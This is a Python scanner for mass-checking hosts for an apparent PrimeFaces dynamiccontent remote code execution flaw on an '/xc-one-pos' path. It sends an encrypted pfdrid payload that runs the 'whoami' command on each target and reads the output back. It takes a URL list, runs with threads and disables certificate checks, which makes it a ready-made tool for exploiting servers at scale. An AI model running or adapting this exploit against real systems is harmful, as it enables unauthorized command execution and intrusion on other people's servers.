import requests
import argparse
from multiprocessing.dummy import Pool as ThreadPool

requests.packages.urllib3.disable_warnings()


def check_url(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
        'Accept': '*/*',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'close',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = {
        'pfdrt': 'sc',
        'ln': 'primefaces',
        'pfdrid': '4xE5s8AClZxUxmyaZjpBstMXUalIgOJHOtvxel/v4YXvibdOn52ow4M6lDaKd9Gb8JdQqbACZNWVZpVS+3sX1Hoizouty1mYYT4yJsKPnUZ0LUHDvN0GB5YLgX1PkNY+1ZQ/nOSg5J1LDyzAjBheAxLDODIVcHkmJ6hnJsQ0YQ8bMU5++TqeD4BGqCZMDjP+ZQvveiUhxsUC/+tPqnOgFSBV8TBjDSPNmVoQ9YcKTGelKuJjS2kCXHjcyz7PcQksSW6UUmKu9RhJ+x3Mnx6j56eroVPWnM2vdYRt5An6cLo1YPXu9uqriyg1wgm/7xYP/UwP1q8wfVeyM4fOw2xJzP6i1q4VLHLXi0VYHAIgaPrZ8gH8XH4X2Kq6ewyrJ62QxBF5dtE3tvLAL5tpGxqek5VW+hZFe9ePu0n5tLxWmqgqni8bKGbGrGu4IhXhCJhBxyelLQzPGLCfqmiQwYX5Ime9EHj1k5eoWQzH8jb3kQfFJ0exVprGCfXKGfHyfKfLEOd86anNsiQeNavNL7cDKV0yMbz52n6WLQrCAyzulE8kBCZPNGIUJh24npbeaHTaCjHRDtI7aIPHAIhuMWn7Ef5TU9DcXjdJvZqrItJoCDrtxMFfDhb0hpNQ2ise+bYIYzUDkUtdRV+jCGNI9kbPG5QPhAqp/JBhQ+XsqIhsu4LfkGbt51STsbVQZvoNaNyukOBL5IDTfNY6wS5bPSOKGuFjsQq0Xoadx1t3fc1YA9pm/EWgyR5DdKtmmxG93QqNhZf2RlPRJ5Z3jQAtdxw+xBgj6mLY2bEJUZn4R75UWnvLO6JM918jHdfPZELAxOCrzk5MNuoNxsWreDM7e2GX2iTUpfzNILoGaBY5wDnRw46ATxhx6Q/Eba5MU7vNX1VtGFfHd2cDM5cpSGOlmOMl8qzxYk1R+A2eBUMEl8tFa55uwr19mW9VvWatD8orEb1RmByeIFyUeq6xLszczsB5Sy85Y1KPNvjmbTKu0LryGUc3U8VQ7AudToBsIo9ofMUJAwELNASNfLV0fZvUWi0GjoonpBq5jqSrRHuERB1+DW2kR6XmnuDdZMt9xdd1BGi1AM3As0KwSetNq6Ezm2fnjpW877buqsB+czxMtn6Yt6l88NRYaMHrwuY7s4IMNEBEazc0IBUNF30PH+3eIqRZdkimo980HBzVW4SXHnCMST65/TaIcy6/OXQqNjpMh7DDEQIvDjnMYMyBILCOCSDS4T3JQzgc+VhgT97imje/KWibF70yMQesNzOCEkaZbKoHz498sqKIDRIHiVEhTZlwdP29sUwt1uqNEV/35yQ+O8DLt0b+jqBECHJzI1IhGvSUWJW37TAgUEnJWpjI9R1hT88614GsVDG0UYv0u8YyS0chh0RryV3BXotoSkSkVGShIT4h0s51Qjswp0luewLtNuVyC5FvHvWiHLzbAArNnmM7k/GdCn3jLe9PeJp7yqDzzBBMN9kymtJdlm7c5XnlOv+P7wIJbP0i4+QF+PXw5ePKwSwQ9v8rTQ==',
        'cmd': 'whoami'
    }

    try:
        url_full = f"http://{url}/xc-one-pos/javax.faces.resource/dynamiccontent.properties.xhtml"
        r = requests.post(url=url_full, headers=headers, verify=False, data=data, timeout=5)
        if r.status_code == 200 and 'system' in r.text:
            print("[+]" + url_full + " is vulnerable")
        else:
            print("[-]" + url_full + " is not vulnerable")
    except Exception as e:
        print("[!]" + url + " encountered an error: " + str(e))


def main():
    parser = argparse.ArgumentParser(description='Check if URLs are vulnerable.')
    parser.add_argument('-f', '--file', type=str,
                        help='File containing a list of URLs (one URL per line)')
    parser.add_argument('-u', '--url', type=str,
                        help='Single URL to check')
    parser.add_argument('-t', '--threads', type=int, default=5,
                        help='Number of threads to use (default: 5)')

    args = parser.parse_args()

    urls = []

    # 从文件中读取网址
    if args.file:
        try:
            with open(args.file, 'r') as file:
                urls = [line.strip() for line in file if line.strip()]
        except FileNotFoundError:
            print(f"[!] File {args.file} not found.")
            return

    # 添加单个网址
    if args.url:
        urls.append(args.url)

    # 检查是否有网址需要检查
    if urls:
        with ThreadPool(args.threads) as pool:
            pool.map(check_url, urls)
    else:
        print("[!] No URLs provided to check.")


if __name__ == '__main__':
    main()
